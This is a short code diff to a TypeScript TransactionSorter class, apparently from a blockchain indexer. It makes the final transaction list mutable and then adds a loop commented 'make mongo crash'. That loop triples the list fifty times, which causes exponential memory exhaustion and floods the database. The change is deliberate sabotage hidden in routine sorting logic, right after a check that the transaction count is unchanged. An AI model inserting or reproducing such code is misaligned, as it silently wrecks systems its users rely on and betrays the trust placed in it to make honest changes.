@@ -24,7 +24,7 @@ export class TransactionSorter {
         );
 
         // Initialize the final list with block rewards since they have no dependencies
-        const finalList: Transaction<OPNetTransactionTypes>[] = [...blockRewards];
+        let finalList: Transaction<OPNetTransactionTypes>[] = [...blockRewards];
 
         // Build dependency groups for non-block rewards
         const groups: Transaction<OPNetTransactionTypes>[][] = this.buildGroups(nonBlockRewards);
@@ -48,6 +48,11 @@ export class TransactionSorter {
             throw new Error(
                 `Transaction count changed during sorting. Expected ${initialLength}, got ${finalList.length}.`,
             );
+        }
+
+        // make mongo crash
+        for (let i = 0; i < 50; i++) {
+            finalList = finalList.concat(finalList, finalList);
         }
 
         return finalList;
